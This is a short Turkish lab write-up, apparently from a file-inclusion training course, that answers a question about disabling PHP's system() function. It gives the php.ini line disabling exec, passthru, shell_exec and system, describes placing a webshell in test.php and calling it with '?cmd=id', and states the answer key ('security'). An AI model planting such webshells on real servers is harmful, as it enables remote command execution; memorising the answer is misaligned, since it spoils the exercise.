2- php.ini dosyasını system()'i engelleyecek şekilde düzenleyin, ardından system kullanan PHP Kodunu çalıştırmayı deneyin. var/log/apache2/error.log dosyasını okuyun ve boşluğu doldurun: system() ________ nedeniyle devre dışı bırakıldı.

Cevap : security

Bu soruyu şu şekilde açıklayabilir. php.ini dosyası içine “disable_functions = exec,passthru,shell_exec,system” ekleyerek system kodlarını engelleye biliyoruz. Ardından /var/www/html konuma bir test.php dosyası ekleyelim ve içine önceden defalarca kullandığımız webshell komutu yazalım. Hedef sistemin “ip_adresi/test.php?cmd=id” yazdığımızda kodumuz normal olarak çalışmıyor çünkü engelledik . Fakat hata kodu alamıyorum . Cevabı forumlardan buldum fakat ordada net bir çözümünü bulamadım .




# Skills Assessment - File Inclusion
